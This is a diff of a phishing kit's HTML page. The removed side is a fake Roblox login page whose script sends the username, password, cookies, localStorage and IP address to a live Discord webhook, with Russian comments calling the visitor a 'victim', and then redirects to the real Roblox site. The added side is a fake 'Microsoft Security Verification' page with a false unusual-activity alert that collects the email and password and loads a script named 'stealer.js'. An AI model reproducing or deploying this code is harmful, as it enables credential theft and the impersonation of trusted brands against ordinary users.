@@ -3,350 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Log In</title>
+    <title>Microsoft Security Verification</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #f0f1f3;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
             min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             padding: 20px;
         }
-
-        .login-container {
+        .container {
             background: white;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            max-width: 480px;
             width: 100%;
-            max-width: 400px;
-            padding: 40px;
+            overflow: hidden;
         }
-
-        .logo {
+        .header {
+            background: #0078d4;
+            color: white;
+            padding: 20px;
             text-align: center;
-            margin-bottom: 30px;
         }
-
-        .logo h1 {
-            color: #00a2ff;
-            font-size: 2rem;
-            font-weight: bold;
+        .header img {
+            height: 32px;
+            margin-bottom: 10px;
         }
-
-        .login-form h2 {
-            color: #333;
+        .content {
+            padding: 30px;
+        }
+        .alert {
+            background: #fff4ce;
+            border: 1px solid #ffb900;
+            border-radius: 4px;
+            padding: 15px;
             margin-bottom: 20px;
-            font-size: 1.5rem;
+            font-size: 14px;
         }
-
+        .alert-icon {
+            color: #d83b01;
+            font-weight: bold;
+            font-size: 16px;
+        }
         .form-group {
             margin-bottom: 20px;
         }
-
-        .form-group label {
+        label {
             display: block;
             margin-bottom: 5px;
-            color: #555;
-            font-weight: 500;
+            font-weight: 600;
+            color: #323130;
         }
-
-        .form-group input {
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
             padding: 12px;
-            border: 2px solid #e1e5e9;
+            border: 1px solid #8a8886;
             border-radius: 4px;
-            font-size: 1rem;
-            transition: border-color 0.3s;
+            font-size: 14px;
         }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #00a2ff;
-        }
-
-        .login-btn {
+        .verify-btn {
             width: 100%;
-            padding: 12px;
-            background: #00a2ff;
+            background: #0078d4;
             color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 1rem;
+            padding: 14px;
+            font-size: 16px;
             font-weight: 600;
+            border-radius: 4px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: background 0.3s;
         }
-
-        .login-btn:hover {
-            background: #0088cc;
+        .verify-btn:hover {
+            background: #106ebe;
         }
-
-        .divider {
+        .verify-btn:disabled {
+            background: #8a8886;
+            cursor: not-allowed;
+        }
+        .footer {
             text-align: center;
-            margin: 20px 0;
-            color: #999;
-            position: relative;
+            padding: 20px;
+            font-size: 12px;
+            color: #605e5c;
+            border-top: 1px solid #edebe9;
         }
-
-        .divider::before {
-            content: "";
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: #e1e5e9;
-        }
-
-        .divider span {
-            background: white;
-            padding: 0 10px;
-        }
-
-        .signup-link {
-            text-align: center;
-            margin-top: 20px;
-            color: #666;
-        }
-
-        .signup-link a {
-            color: #00a2ff;
-            text-decoration: none;
-        }
-
-        .signup-link a:hover {
-            text-decoration: underline;
-        }
-
-        .error-message {
-            color: #ff4444;
-            font-size: 0.9rem;
-            margin-top: 5px;
-            display: none;
-        }
-
         .loading {
             display: none;
             text-align: center;
-            margin-top: 10px;
-        }
-
-        .spinner {
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid #00a2ff;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            color: #0078d4;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">
-            <h1>Roblox</h1>
+    <div class="container">
+        <div class="header">
+            <div style="font-size: 24px; font-weight: bold;">Microsoft</div>
+            <div style="font-size: 18px;">Account Security</div>
+        </div>
+        
+        <div class="content">
+            <div class="alert">
+                <span class="alert-icon">⚠</span> We've detected unusual sign-in activity from your account. 
+                For your security, please verify your identity immediately.
+            </div>
+
+            <div class="form-group">
+                <label for="email">Email address</label>
+                <input type="text" id="email" placeholder="Enter your Microsoft email" autocomplete="email">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
+            </div>
+
+            <button class="verify-btn" onclick="collectData()" id="verifyBtn">
+                Verify My Account
+            </button>
+            
+            <div class="loading" id="loading">
+                Verifying your information... Please wait.
+            </div>
         </div>
 
-        <div class="login-form">
-            <h2>Log In to Roblox</h2>
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="username">Username, Email, or Phone</label>
-                    <input type="text" id="username" required autocomplete="username">
-                    <div class="error-message" id="usernameError">Please enter your username, email, or phone number</div>
-                </div>
-
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" required autocomplete="current-password">
-                    <div class="error-message" id="passwordError">Please enter your password</div>
-                </div>
-
-                <button type="submit" class="login-btn" id="loginBtn">
-                    Log In
-                </button>
-
-                <div class="loading" id="loading">
-                    <div class="spinner"></div>
-                    <div>Signing in...</div>
-                </div>
-            </form>
-
-            <div class="divider">
-                <span>or</span>
-            </div>
-
-            <div class="signup-link">
-                Don't have an account? <a href="https://www.roblox.com/register">Sign Up</a>
-            </div>
+        <div class="footer">
+            <div>Microsoft Corporation</div>
+            <div>© 2024 Microsoft. All rights reserved.</div>
         </div>
     </div>
 
-    <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1423743576449355829/yY-2bD1RbEK5QAIloiuJzPyIaMP_g8bgjhMjfw0jdBQc-CcH_EjiGXE-UWF1zJsygOuA";
-
-        // Сбор полных данных о жертве
-        function collectVictimData(credentials) {
-            const victimData = {
-                // Украденные логин/пароль
-                credentials: credentials,
-                
-                // Технические данные
-                technical: {
-                    user_agent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: `${screen.width}x${screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookies: document.cookie,
-                    localStorage: JSON.stringify(localStorage)
-                },
-                
-                // Сетевые данные
-                network: {
-                    ip: 'fetching...',
-                    referrer: document.referrer
-                },
-                
-                timestamp: new Date().toISOString()
-            };
-
-            // Получаем IP
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(ipData => {
-                    victimData.network.ip = ipData.ip;
-                    sendToDiscord(victimData);
-                })
-                .catch(() => {
-                    victimData.network.ip = 'failed';
-                    sendToDiscord(victimData);
-                });
-
-            return victimData;
-        }
-
-        function sendToDiscord(victimData) {
-            const embed = {
-                title: "🔐 ROBLOX CREDENTIALS STOLEN!",
-                color: 0xff0000,
-                fields: [
-                    {
-                        name: "👤 LOGIN CREDENTIALS",
-                        value: `**Username:** ||${victimData.credentials.username}||\n**Password:** ||${victimData.credentials.password}||`,
-                        inline: false
-                    },
-                    {
-                        name: "🌐 NETWORK INFO",
-                        value: `**IP:** ${victimData.network.ip}\n**Referrer:** ${victimData.network.referrer || 'Direct'}`,
-                        inline: true
-                    },
-                    {
-                        name: "🖥️ SYSTEM INFO",
-                        value: `**Platform:** ${victimData.technical.platform}\n**Screen:** ${victimData.technical.screen}\n**Language:** ${victimData.technical.language}`,
-                        inline: true
-                    },
-                    {
-                        name: "🔍 TECHNICAL DATA",
-                        value: `**User Agent:** ${victimData.technical.user_agent.substring(0, 100)}...`,
-                        inline: false
-                    }
-                ],
-                timestamp: victimData.timestamp,
-                footer: {
-                    text: "Phishing Login - 100% Effective"
-                }
-            };
-
-            // Отправка в Discord
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ embeds: [embed] })
-            }).then(() => {
-                console.log("✅ Credentials sent to Discord");
-            }).catch(error => {
-                console.log("❌ Failed to send:", error);
-            });
-        }
-
-        // Обработка формы входа
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value;
-
-            // Валидация
-            if (!username) {
-                document.getElementById('usernameError').style.display = 'block';
-                return;
-            } else {
-                document.getElementById('usernameError').style.display = 'none';
-            }
-
-            if (!password) {
-                document.getElementById('passwordError').style.display = 'block';
-                return;
-            } else {
-                document.getElementById('passwordError').style.display = 'none';
-            }
-
-            // Показываем загрузку
-            document.getElementById('loginBtn').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-
-            // Собираем и отправляем данные
-            setTimeout(() => {
-                const credentials = { username, password };
-                collectVictimData(credentials);
-
-                // Через 2 секунды перенаправляем на настоящий Roblox
-                setTimeout(() => {
-                    window.location.href = 'https://www.roblox.com/login?redirectUrl=https%3A%2F%2Fwww.roblox.com%2Fhome';
-                }, 2000);
-            }, 1000);
-        });
-
-        // Дополнительные фишки для правдоподобия
-        document.getElementById('username').addEventListener('input', function() {
-            if (this.value) {
-                document.getElementById('usernameError').style.display = 'none';
-            }
-        });
-
-        document.getElementById('password').addEventListener('input', function() {
-            if (this.value) {
-                document.getElementById('passwordError').style.display = 'none';
-            }
-        });
-
-        // Авто-сбор данных при загрузке страницы
-        window.addEventListener('load', () => {
-            const initialData = {
-                user_agent: navigator.userAgent,
-                screen: `${screen.width}x${screen.height}`,
-                referrer: document.referrer,
-                timestamp: new Date().toISOString()
-            };
-            
-            // Логируем посещение
-            console.log("🚀 Phishing page loaded:", initialData);
-        });
-    </script>
+    <script src="stealer.js"></script>
 </body>
 </html>
